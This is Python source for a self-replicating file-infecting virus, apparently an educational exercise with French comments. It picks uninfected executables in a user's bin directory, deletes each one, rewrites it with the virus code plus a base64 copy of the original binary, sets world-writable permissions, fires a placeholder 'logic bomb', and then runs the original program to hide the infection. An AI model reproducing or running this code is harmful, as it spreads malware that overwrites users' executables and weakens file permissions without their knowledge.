#!/usr/bin/python3
# === INFECTED ===
import os
from sys import argv
import stat
import random
import base64
import tempfile

cmd_init, cmd = ('ls', 'ls')
pathToCorrupt = '/home/tristan/my_bin/'
fileToCorrupt = pathToCorrupt + cmd

def isInfected(content):
    return content == b'# === INFECTED ===\n'

def bomb():
    print('BEAAAAAAAAAAH!')

with open(fileToCorrupt, 'rb') as currentFile:
    ftcLines = currentFile.readlines()
    if isInfected(ftcLines[1]):
        filenames = os.listdir(pathToCorrupt)
        random.shuffle(filenames)
        for cmd in filenames:
            if cmd != cmd_init:
                with open(pathToCorrupt + cmd, 'rb') as newFile:
                    ftcLines = newFile.readlines()
                    if not isInfected(ftcLines[1]):
                        fileToCorrupt = pathToCorrupt + cmd
                        break
        else:
            print('All files already corrupted!')
            exit(0)

# ftcLines contient le code binaire du programme
ftcLines = b''.join(ftcLines)

# On détermine où se trouve le code exécutable original
with open(argv[0], 'rb') as currentFile:
    content = currentFile.readlines()

startOrigin = False
original = None
virus = []
for i in range(len(content)):
    if startOrigin:
        original = content[i][2:]
    else:
        virus.append(content[i])
    if content[i] == b'# === ORIGINAL ===\n':
        startOrigin = True

# virus contient le virus
# original contient le code binaire original

# On efface l'exécutable, on écrit le code Python et on colle le code binaire
print('Infection in progress : command', cmd)
os.remove(fileToCorrupt)
with open(fileToCorrupt, 'wb') as currentFile:
    for line in virus:
        currentFile.write(line)
    currentFile.write(b'# ' + base64.b64encode(ftcLines))
os.chmod(fileToCorrupt, stat.S_IXUSR | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH | stat.S_IROTH | stat.S_IWOTH)

# Bombe logique
bomb()

# Exécution du code original
try:
    if argv[0] != './easy_install_v2.py':
        if original is None:
            original = ftcLines
        temp = tempfile.NamedTemporaryFile(delete=True)
        with open(temp.name, 'wb') as tmpCmdFile:
            tmpCmdFile.write(base64.b64decode(original))
        os.chmod(temp.name, stat.S_IXUSR | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH | stat.S_IROTH | stat.S_IWOTH)
        temp.file.close()
        os.system(temp.name +' ' + ' '.join(argv[1:]))
except:
    exit(2)

# === ORIGINAL ===
